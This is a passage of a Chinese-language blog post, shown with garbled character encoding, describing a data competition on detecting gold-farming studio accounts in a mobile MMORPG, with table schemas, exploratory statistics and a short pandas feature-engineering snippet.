(P+3R)</p><p>P‰∏∫ÂáÜÁ°ÆÂ∫¶, Âç≥Êèê‰∫§ÁªìÊûúÊúâÂ§öÂ§ßÊØîÁéáÊòØÁúüÊ≠£ÁöÑÂ∑•‰ΩúÂÆ§<br>R‰∏∫Ë¶ÜÁõñÁéá, Âç≥Êèê‰∫§ÁªìÊûúË¶ÜÁõñ‰∫ÜÂÖ®‰ΩìÂ∑•‰ΩúÂÆ§ÁöÑÊØîÁéá</p><a id="more"></a><h1 id="Êï∞ÊçÆËØ¥Êòé"><a href="#Êï∞ÊçÆËØ¥Êòé" class="headerlink" title="Êï∞ÊçÆËØ¥Êòé"></a>Êï∞ÊçÆËØ¥Êòé</h1><p>Êï∞ÊçÆÊù•Ëá™ÊüêMMORPG(Â§ßÂûãÂ§ö‰∫∫Âú®Á∫øËßíËâ≤ÊâÆÊºîÊ∏∏Êàè), Âπ∂ÁªèËøáËÑ±ÊïèÂ§ÑÁêÜ</p><ul><li>Êó•Êúü<ul><li>2020Âπ¥03Êúà01Êó•ÁöÑÊï∞ÊçÆ(Âê´Ê†áÁ≠æ) ‰∏∫ËÆ≠ÁªÉÈõÜ</li><li>2020Âπ¥03Êúà05Êó•ÁöÑÊï∞ÊçÆ‰∏∫ÊµãËØïÈõÜ</li></ul></li><li>Âü∫Á°ÄÁü•ËØÜ<ul><li>uin: ÂîØ‰∏ÄÊ†áËØÜÊ∏∏ÊàèÂÜÖÁöÑ‰∏Ä‰∏™Áî®Êà∑, ÊØîÂ¶Ç‰Ω†ÁöÑqqÊàñÂæÆ‰ø°</li><li>roleid: ‰∏Ä‰∏™uinÂèØËÉΩÊúâÂ§ö‰∏™ËßíËâ≤</li></ul></li><li>Â≠òÂÇ®Ê†ºÂºè<ul><li>Êñá‰ª∂Âêç‰∏∫: Âπ¥ÊúàÊó•.txt</li><li>‰ª•ÊñáÊú¨Â≠òÂÇ®</li><li>‰ª•Á´ñÁ∫ø|ÂàÜÈöî</li><li>Á©∫ Êàñ \N Ë°®Á§∫Êï∞ÊçÆÁº∫Â§±</li></ul></li><li>ÁõÆÂΩïËØ¥Êòé<ul><li>label_black ÈªëÊ†áÁ≠æ: ÊâìÈáëÂ∑•‰ΩúÂÆ§Â∏êÂè∑</li><li>label_white ÁôΩÊ†áÁ≠æ: ÈùûÊâìÈáëÂ∑•‰ΩúÂÆ§Â∏êÂè∑</li><li>role_login ËßíËâ≤ÁôªÂÖ•Ê∏∏Êàè</li><li>role_logout ËßíËâ≤ÁôªÂá∫Ê∏∏Êàè</li><li>role_create ÂàõÂª∫Êñ∞ËßíËâ≤</li><li>uin_chat ÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞</li><li>‰ª•‰∏ãÊï∞ÊçÆ‰ªÖÂú®ÂÜ≥ËµõÊó∂Êèê‰æõ<ul><li>role_moneyflow ËßíËâ≤ÁöÑËØ¶ÁªÜÈáëÈí±ÊµÅÊ∞¥‰ø°ÊÅØ(ÂΩìÂ§©ÊåâÊó∂Èó¥È°∫Â∫èÂâç300Êù°ËÆ∞ÂΩï)</li><li>role_itemflow ËßíËâ≤ÁöÑËØ¶ÁªÜÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ(ÂΩìÂ§©ÊåâÊó∂Èó¥È°∫Â∫èÂâç300Êù°ËÆ∞ÂΩï)</li></ul></li></ul></li></ul><h2 id="role-login-ËßíËâ≤ÁôªÂÖ•Ê∏∏Êàè"><a href="#role-login-ËßíËâ≤ÁôªÂÖ•Ê∏∏Êàè" class="headerlink" title="role_login ËßíËâ≤ÁôªÂÖ•Ê∏∏Êàè"></a>role_login ËßíËâ≤ÁôªÂÖ•Ê∏∏Êàè</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">Êó∂Èó¥,Ê†ºÂºèYYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">ÂæÆ‰ø°=1/ÊâãQ=2/Ê∏∏ÂÆ¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">Ê∏∏ÊàèÂ∞èÂå∫(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">ËßíËâ≤id(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">ËßíËâ≤Âêç(Â∑≤ÁΩÆÁ©∫)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">ËÅå‰∏ö</td></tr><tr><td align="center">9</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">Á≠âÁ∫ß</td></tr><tr><td align="center">10</td><td align="center">power</td><td align="center">BIGINT</td><td align="center">ÊàòÂäõ</td></tr><tr><td align="center">11</td><td align="center">friendsnum</td><td align="center">BIGINT</td><td align="center">Â•ΩÂèãÊï∞Èáè</td></tr><tr><td align="center">12</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G/NULL</td></tr><tr><td align="center">13</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">ÂÆ¢Êà∑Á´ØIP(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">14</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">ËÆæÂ§áID(Â∑≤Âä†ÂØÜ)</td></tr></tbody></table><h2 id="role-logout-ËßíËâ≤ÁôªÂá∫Ê∏∏Êàè"><a href="#role-logout-ËßíËâ≤ÁôªÂá∫Ê∏∏Êàè" class="headerlink" title="role_logout ËßíËâ≤ÁôªÂá∫Ê∏∏Êàè"></a>role_logout ËßíËâ≤ÁôªÂá∫Ê∏∏Êàè</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">Êó∂Èó¥,Ê†ºÂºèYYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">ÂæÆ‰ø°=1/ÊâãQ=2/Ê∏∏ÂÆ¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">Ê∏∏ÊàèÂ∞èÂå∫(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">ËßíËâ≤id(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">ËßíËâ≤Âêç(Â∑≤ÁΩÆÁ©∫)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">ËÅå‰∏ö</td></tr><tr><td align="center">9</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">Á≠âÁ∫ß</td></tr><tr><td align="center">10</td><td align="center">power</td><td align="center">BIGINT</td><td align="center">ÊàòÂäõ</td></tr><tr><td align="center">11</td><td align="center">friendsnum</td><td align="center">BIGINT</td><td align="center">Â•ΩÂèãÊï∞Èáè</td></tr><tr><td align="center">12</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G/NULL</td></tr><tr><td align="center">13</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">ÂÆ¢Êà∑Á´ØIP(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">14</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">ËÆæÂ§áID(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">15</td><td align="center">onlinetime</td><td align="center">BIGINT</td><td align="center">Âú®Á∫øÊó∂Èïø(Áßí)</td></tr></tbody></table><h2 id="role-create-ÂàõÂª∫Êñ∞ËßíËâ≤"><a href="#role-create-ÂàõÂª∫Êñ∞ËßíËâ≤" class="headerlink" title="role_create ÂàõÂª∫Êñ∞ËßíËâ≤"></a>role_create ÂàõÂª∫Êñ∞ËßíËâ≤</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">YYYY-MM-DD HH#MM#SS</td></tr><tr><td align="center">2</td><td align="center">platid</td><td align="center">BIGINT</td><td align="center">ios=0/android=1</td></tr><tr><td align="center">3</td><td align="center">areaid</td><td align="center">BIGINT</td><td align="center">ÂæÆ‰ø°=1/ÊâãQ=2/Ê∏∏ÂÆ¢=3</td></tr><tr><td align="center">4</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">Ê∏∏ÊàèÂ∞èÂå∫(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">5</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">6</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">ËßíËâ≤id(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">7</td><td align="center">rolename</td><td align="center">STRING</td><td align="center">ËßíËâ≤Âêç(Â∑≤ÁΩÆÁ©∫)</td></tr><tr><td align="center">8</td><td align="center">job</td><td align="center">STRING</td><td align="center">ËÅå‰∏ö</td></tr><tr><td align="center">9</td><td align="center">regchannel</td><td align="center">STRING</td><td align="center">Ê≥®ÂÜåÊ∏†ÈÅì</td></tr><tr><td align="center">10</td><td align="center">network</td><td align="center">STRING</td><td align="center">3G/WIFI/2G</td></tr><tr><td align="center">11</td><td align="center">clientip</td><td align="center">STRING</td><td align="center">ÂÆ¢Êà∑Á´ØIP(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">12</td><td align="center">deviceid</td><td align="center">STRING</td><td align="center">ËÆæÂ§áID(Â∑≤Âä†ÂØÜ)</td></tr></tbody></table><h2 id="uin-chat-ÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞"><a href="#uin-chat-ÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞" class="headerlink" title="uin_chat ÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞"></a>uin_chat ÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">2</td><td align="center">chat_cnt</td><td align="center">BIGINT</td><td align="center">ÂèëË®ÄÊù°Êï∞</td></tr></tbody></table><h2 id="role-moneyflow-Â∏êÂè∑ÁöÑËØ¶ÁªÜÈáëÈí±ÊµÅÊ∞¥‰ø°ÊÅØ"><a href="#role-moneyflow-Â∏êÂè∑ÁöÑËØ¶ÁªÜÈáëÈí±ÊµÅÊ∞¥‰ø°ÊÅØ" class="headerlink" title="role_moneyflow Â∏êÂè∑ÁöÑËØ¶ÁªÜÈáëÈí±ÊµÅÊ∞¥‰ø°ÊÅØ"></a>role_moneyflow Â∏êÂè∑ÁöÑËØ¶ÁªÜÈáëÈí±ÊµÅÊ∞¥‰ø°ÊÅØ</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">Êó∂Èó¥,Ê†ºÂºèYYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">Ê∏∏ÊàèÂ∞èÂå∫(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">3</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">4</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">ËßíËâ≤id(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">5</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">Á≠âÁ∫ß</td></tr><tr><td align="center">6</td><td align="center">iMoneyType</td><td align="center">STRING</td><td align="center">Ë¥ßÂ∏ÅÁ±ªÂûã</td></tr><tr><td align="center">7</td><td align="center">iMoney</td><td align="center">BIGINT</td><td align="center">Ë¥ßÂ∏ÅÂèòÂåñÊï∞</td></tr><tr><td align="center">8</td><td align="center">AfterMoney</td><td align="center">BIGINT</td><td align="center">Âä®‰ΩúÂêéÁöÑË¥ßÂ∏ÅÂ≠òÈáè</td></tr><tr><td align="center">9</td><td align="center">AddOrReduce</td><td align="center">BIGINT</td><td align="center">Ë¥ßÂ∏ÅÂ¢ûÂä† 0/ÂáèÂ∞ë 1</td></tr><tr><td align="center">10</td><td align="center">Reason</td><td align="center">STRING</td><td align="center">Ë¥ßÂ∏ÅÊµÅÂä®‰∏ÄÁ∫ßÂéüÂõ†</td></tr><tr><td align="center">11</td><td align="center">SubReason</td><td align="center">STRING</td><td align="center">Ë¥ßÂ∏ÅÊµÅÂä®‰∫åÁ∫ßÂéüÂõ†</td></tr></tbody></table><h2 id="role-itemflow-Â∏êÂè∑ÁöÑËØ¶ÁªÜÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ"><a href="#role-itemflow-Â∏êÂè∑ÁöÑËØ¶ÁªÜÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ" class="headerlink" title="role_itemflow Â∏êÂè∑ÁöÑËØ¶ÁªÜÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ"></a>role_itemflow Â∏êÂè∑ÁöÑËØ¶ÁªÜÁâ©ÂìÅÊµÅÊ∞¥‰ø°ÊÅØ</h2><table><thead><tr><th align="center">#</th><th align="center">ÂàóÂêç</th><th align="center">Á±ªÂûã</th><th align="center">Â§áÊ≥®</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">dteventtime</td><td align="center">STRING</td><td align="center">Êó∂Èó¥,Ê†ºÂºèYYYY-MM-DD HH:MM:SS</td></tr><tr><td align="center">2</td><td align="center">worldid</td><td align="center">BIGINT</td><td align="center">Ê∏∏ÊàèÂ∞èÂå∫(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">3</td><td align="center">uin</td><td align="center">STRING</td><td align="center">openid(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">4</td><td align="center">roleid</td><td align="center">STRING</td><td align="center">ËßíËâ≤id(Â∑≤Âä†ÂØÜ)</td></tr><tr><td align="center">5</td><td align="center">rolelevel</td><td align="center">BIGINT</td><td align="center">Á≠âÁ∫ß</td></tr><tr><td align="center">6</td><td align="center">Itemtype</td><td align="center">STRING</td><td align="center">ÈÅìÂÖ∑Á±ªÂûã</td></tr><tr><td align="center">7</td><td align="center">Itemid</td><td align="center">STRING</td><td align="center">ÈÅìÂÖ∑ID</td></tr><tr><td align="center">8</td><td align="center">Count</td><td align="center">BIGINT</td><td align="center">ÈÅìÂÖ∑ÂèòÂä®Êï∞Èáè</td></tr><tr><td align="center">9</td><td align="center">Aftercount</td><td align="center">BIGINT</td><td align="center">Âä®‰ΩúÂêéÈÅìÂÖ∑Ââ©‰ΩôÊï∞Èáè</td></tr><tr><td align="center">10</td><td align="center">Addorreduce</td><td align="center">BIGINT</td><td align="center">Â¢ûÂä† 0/ÂáèÂ∞ë 1</td></tr><tr><td align="center">11</td><td align="center">Reason</td><td align="center">STRING</td><td align="center">ÈÅìÂÖ∑ÊµÅÂä®‰∏ÄÁ∫ßÂéüÂõ†</td></tr><tr><td align="center">12</td><td align="center">SubReason</td><td align="center">STRING</td><td align="center">ÈÅìÂÖ∑ÊµÅÂä®‰∫åÁ∫ßÂéüÂõ†</td></tr></tbody></table><h1 id="ÁÆÄÂçï-eda"><a href="#ÁÆÄÂçï-eda" class="headerlink" title="ÁÆÄÂçï eda"></a>ÁÆÄÂçï eda</h1><p>ËÆ≠ÁªÉÈõÜÊÄªË¥¶Êà∑Êï∞‰∏∫74704ÔºåÂÖ∂‰∏≠ÊâìÈáëÂ∑•‰ΩúÂÆ§Ë¥¶Êà∑10202ÔºåÊ≠£Â∏∏Áî®Êà∑64502ÔºåÊ≠£Ë¥üÊ†∑Êú¨ÂàÜÂ∏É‰∏çÂùáÂåÄ„ÄÇÁôªÂÖ•Êï∞ÊçÆÁöÑÁ¶ªÊï£Êï∞ÊçÆÁªüËÆ°‰ø°ÊÅØÂ¶ÇÂõæ1ÊâÄÁ§∫„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_1.png" alt="Âõæ1 ÁôªÂÖ•Êï∞ÊçÆÁöÑÁ¶ªÊï£Êï∞ÊçÆÁªüËÆ°" title="">                </div>                <div class="image-caption">Âõæ1 ÁôªÂÖ•Êï∞ÊçÆÁöÑÁ¶ªÊï£Êï∞ÊçÆÁªüËÆ°</div>            </figure></div><p>ÁôªÂá∫Êï∞ÊçÆÂ≠óÊÆµÂíåÁôªÂÖ•Êï∞ÊçÆÂ∑Æ‰∏çÂ§öÔºå‰ªÖÂ§ö‰∫ÜÂú®Á∫øÊó∂ÈïøÔºàonlinetimeÔºâÁâπÂæÅÔºåÊâÄ‰ª•Âú®ÂêéÁª≠ÁöÑÂ§ÑÁêÜ‰∏≠ÔºåÂ∞Ü‰∫åËÄÖÂêàÂπ∂Êàê operation Ë°®ÊîæÂú®‰∏ÄËµ∑‰ΩøÁî®Ôºå‰ΩøÂæó‰ª£Á†ÅÊõ¥ÁÆÄÊ¥Å„ÄÇrolename ÂÖ®‰∏∫Á©∫Ê≤°Êúâ‰ΩøÁî®‰ª∑ÂÄº„ÄÇ‰ªé‰∏öÂä°‰∏äËÆ≤Ôºådeviceid ÊòØ‰∏Ä‰∏™ÂæàÈáçË¶ÅÁöÑÁâπÂæÅÔºåÊ†πÊçÆËÆæÂ§áidÊàë‰ª¨ÂèØ‰ª•Âà§Êñ≠Â§öË¥¶Âè∑ÂÖ±‰∫´ËÆæÂ§áÁöÑÊÉÖÂÜµ„ÄÇ‰ΩÜÂú®Êï∞ÊçÆÈõÜ‰∏≠ÔºåÊØèÂ§©‰ªÖÊúâ‰∏Ä‰∏™deviceidÔºå3.1Âè∑ÁöÑ deviceid ÂÖ®‰∏∫6259A4950D8B0CA5Ôºå3.5Âè∑ÁöÑ deviceid ÂÖ®‰∏∫71A1315F1949F262ÔºåÂ§±Âéª‰∫Ü‰ΩøÁî®‰ª∑ÂÄº„ÄÇ</p><p>Êï∞ÊçÆÈõÜÁªôÂá∫‰∫ÜÊåâÂ§©ÁªüËÆ°ÁöÑÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞ÔºåÊï¥‰ΩìÂàÜÂ∏ÉÂ¶ÇÂõæ2ÊâÄÁ§∫ÔºåÂÖ∑ÊúâÂæàÊòéÊòæÁöÑÈïøÂ∞æÂàÜÂ∏É„ÄÇÂàÜÊòØÂê¶ÊòØÂ∑•‰ΩúÂÆ§ËßÇÂØüÂèëË®ÄÊ¨°Êï∞ÂàÜÂ∏ÉÔºåÂ¶ÇÂõæ3ÂíåÂõæ4ÊâÄÁ§∫ÔºåÂèØ‰ª•ÊòéÊòæÁúãÂá∫Â∑•‰ΩúÂÆ§ÁöÑÂèëË®ÄÊ¨°Êï∞Áõ∏ËæÉ‰∫éÊ≠£Â∏∏Áî®Êà∑ËæÉÂ§öÔºåÊé®ÊµãÊòØÂú®Ê∏∏Êàè‰∏≠ËøõË°åÂè´ÂçñÊàñËÄÖ‰∫§ÊòìËÅäÂ§©„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_2.png" alt="Âõæ2 Êï¥‰ΩìÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞" title="">                </div>                <div class="image-caption">Âõæ2 Êï¥‰ΩìÂ∏êÂè∑ÂèëË®ÄÊ¨°Êï∞</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_3.png" alt="Âõæ3 Â∑•‰ΩúÂÆ§Â∏êÂè∑ÂèëË®ÄÊ¨°Êï∞" title="">                </div>                <div class="image-caption">Âõæ3 Â∑•‰ΩúÂÆ§Â∏êÂè∑ÂèëË®ÄÊ¨°Êï∞</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_4.png" alt="Âõæ4 Ê≠£Â∏∏Áî®Êà∑Â∏êÂè∑ÂèëË®ÄÊ¨°Êï∞" title="">                </div>                <div class="image-caption">Âõæ4 Ê≠£Â∏∏Áî®Êà∑Â∏êÂè∑ÂèëË®ÄÊ¨°Êï∞</div>            </figure></div><p>Áî®Êà∑ÂàõÂª∫ËßíËâ≤Êï∞ÊçÆÔºå‰∏ªË¶ÅÈúÄË¶ÅÂÖ≥Ê≥®regchannelÔºàÊ≥®ÂÜåÊ∏†ÈÅìÔºâÔºåÊÄªÂÖ±Êúâ76Áßç‰∏çÂêåÁöÑÊ≥®ÂÜåÊ∏†ÈÅìÔºå‰∏ªË¶ÅÊ∏†ÈÅìÊï∞ÈáèÂàÜÂ∏ÉÂ¶ÇÂõæ5ÊâÄÁ§∫„ÄÇ</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/tencent2020_5.png" alt="Âõæ5 ‰∏ªË¶ÅÊ≥®ÂÜåÊ∏†ÈÅìÊï∞ÈáèÂàÜÂ∏É" title="">                </div>                <div class="image-caption">Âõæ5 ‰∏ªË¶ÅÊ≥®ÂÜåÊ∏†ÈÅìÊï∞ÈáèÂàÜÂ∏É</div>            </figure></div><h1 id="ÁâπÂæÅÂ∑•Á®ã"><a href="#ÁâπÂæÅÂ∑•Á®ã" class="headerlink" title="ÁâπÂæÅÂ∑•Á®ã"></a>ÁâπÂæÅÂ∑•Á®ã</h1><p>Êï∞ÊçÆÈõÜÁªôÂá∫‰∫ÜÊìç‰ΩúÊó∂Èó¥ÔºåÂèØ‰ª•ÊèêÂèñÂá∫Â∞èÊó∂‰ø°ÊÅØËøõË°åËøõ‰∏ÄÊ≠•ÁªüËÆ°„ÄÇip ÁâπÂæÅËÉΩÂ§üÂæàÂ•ΩÁöÑÂèçÊò†ÊòØÂê¶Â≠òÂú®Âêå‰∏Ä ip ‰∏ãÁöÑÂ§öË¥¶Êà∑Ë°å‰∏∫„ÄÇip ÁâπÂæÅÊØîËæÉÁªÜÂåñÔºåÊ†πÊçÆÂü∫Êú¨ÁöÑÁΩëÁªúÁü•ËØÜÔºåÊàë‰ª¨ÂèØ‰ª•Â∞ÜÂÖ∂ÂàÜÊÆµÔºåÂæóÂà∞ÈöêËóèÁöÑÂú∞Âüü‰ø°ÊÅØ„ÄÇÊâÄ‰ª•Âú®Êú¨ÊñπÊ°à‰∏≠ÔºåÊûÑÈÄ†‰∫Üclientip_3 Âíå clientip_2ÔºåÂàÜÂà´Âèñ clientip ÁöÑÂâç‰∏âÊÆµÂíåÂâç‰∏§ÊÆµ„ÄÇlogout Ë°®ÁªôÂá∫‰∫ÜÂú®Á∫øÊó∂ÈïøÁâπÂæÅÔºåÁ±ª‰ººÁöÑÔºåÊàë‰ª¨ÂèØ‰ª•Â∞Ü login Ë°®ÊåâÊó∂Èó¥ÊéíÂ∫èÔºåÁôªÂÖ•Êó∂Èó¥ÂáèÂéª‰∏ä‰∏ÄÊ¨°ÁöÑÁôªÂá∫Êó∂Èó¥ÂèØ‰ª•ÂæóÂà∞Á¶ªÁ∫øÊó∂ÈïøÁâπÂæÅ„ÄÇ</p><h2 id="ÁªüËÆ°ÁâπÂæÅ"><a href="#ÁªüËÆ°ÁâπÂæÅ" class="headerlink" title="ÁªüËÆ°ÁâπÂæÅ"></a>ÁªüËÆ°ÁâπÂæÅ</h2><p>ÁªüËÆ°ÁâπÂæÅÂåÖÊã¨‰∏§ÊñπÈù¢Ôºå‰ª•uin‰∏∫Âçï‰ΩçÔºåÂàÜÂà´ÈááÁî®‰∏çÂêåÁöÑÊñπÊ≥ïÂØπÊï∞ÂÄºÁâπÂæÅÂíåÁ±ªÂà´ÁâπÂæÅËøõË°åÁªüËÆ°„ÄÇÂØπÊï∞ÂÄºÁâπÂæÅÈááÂèñ‰∏ãÂàóÁªüËÆ°ÊñπÊ≥ïÔºö</p><ul><li>Âú®Á∫øÊó∂ÈïøÔºösumÔºåmedianÔºåmean;</li><li>Á¶ªÁ∫øÊó∂ÈïøÔºömeanÔºåmax</li><li>ËßíËâ≤Á≠âÁ∫ßÔºömeanÔºåmax;</li><li>ÊàòÂäõÔºömeanÔºåmaxÔºõ</li><li>Â•ΩÂèãÊï∞ÈáèÔºömeanÔºåmaxÔºõ</li><li>Áî®Êà∑Êìç‰ΩúÊó∂Èó¥ÔºàÂ∞èÊó∂ÔºâÔºömeanÔºåminÔºåmax„ÄÇ</li></ul><p>ÂØπ‰∏ãÂàóÁ±ªÂà´ÁâπÂæÅËøõË°åcountÁªüËÆ°Ôºöplatid, worldid, roleid, job, network, clientip, clientip_3, hour, regchannel„ÄÇ</p><h2 id="ip-ÁâπÂæÅ"><a href="#ip-ÁâπÂæÅ" class="headerlink" title="ip ÁâπÂæÅ"></a>ip ÁâπÂæÅ</h2><p>Êü•ËµÑÊñôÂèØÁü•ÔºåÂ∑•‰ΩúÂÆ§ÂæÄÂæÄ‰ºöË¥≠‰π∞Â§ßÈáèÊú∫Âô®ÔºåÂà©Áî®Ëá™Âä®ÂåñËÑöÊú¨ËøõË°åÊâìÈáëÔºåÊâÄ‰ª•‰ºöÂá∫Áé∞Â§ö‰∏™Ë¥¶Âè∑ÂÖ±‰∫´ ip ÁöÑÊÉÖÂÜµ„ÄÇÊàë‰ª¨ËÆ°ÁÆóÊØè‰∏™ ip ‰∏ãÁôªÂΩïËøáÂ§öÂ∞ë‰∏™Ë¥¶Êà∑ÔºåÂÜçÂØπÊüêË¥¶Êà∑‰ΩøÁî®ËøáÁöÑÊâÄÊúâ ip ËÆ°ÁÆóÂÖ∂ÁôªÂΩïËøáË¥¶Êà∑Êï∞ÁöÑÂπ≥ÂùáÂÄºÔºåËØ•ÂÄºË∂äÂ§ßÔºåËØ¥ÊòéËØ•Ë¥¶Êà∑ÊâÄÂ§ÑÁΩëÊÆµÊúâÂ§ßÈáèË¥¶Êà∑ÁôªÂΩïÔºåË∂äÊúâÂèØËÉΩÊòØÂ∑•‰ΩúÂÆ§„ÄÇ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">for f in [&#39;clientip&#39;, &#39;clientip_3&#39;]:</span><br><span class="line">    df_temp &#x3D; operation[[&#39;uin&#39;, f]]</span><br><span class="line">    df_temp.drop_duplicates(inplace&#x3D;True)</span><br><span class="line">    df_temp &#x3D; df_temp.groupby([f])[&#39;uin&#39;].nunique().reset_index()</span><br><span class="line">    df_temp.columns &#x3D; [f, &#39;uin_count&#39;]</span><br><span class="line"></span><br><span class="line">    df_temp2 &#x3D; operation[[&#39;uin&#39;, f]]</span><br><span class="line">    df_temp2.drop_duplicates(inplace&#x3D;True)</span><br><span class="line">    df_temp &#x3D; df_temp2.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br><span class="line"></span><br><span class="line">    df_temp &#x3D; df_temp.groupby([&#39;uin&#39;])[&#39;uin_count&#39;].agg(&#123;</span><br><span class="line">        &#39;&#123;&#125;_uin_count_mean&#39;.format(f):</span><br><span class="line">        &#39;mean&#39;</span><br><span class="line">    &#125;).reset_index()</span><br><span class="line">    df_feature &#x3D; df_feature.merge(df_temp, how&#x3D;&#39;left&#39;)</span><br><span class="line">    del df_temp, df_temp2</span><br><span class="line">    gc.collect()</span><br></pre></td></tr></table></figure><h2 id="Ê†áÁ≠æ‰∫îÊäò‰∫§ÂèâÁªüËÆ°ÁâπÂæÅ"><a href="#Ê†áÁ≠æ‰∫îÊäò‰∫§ÂèâÁªüËÆ°ÁâπÂæÅ" class="headerlink" 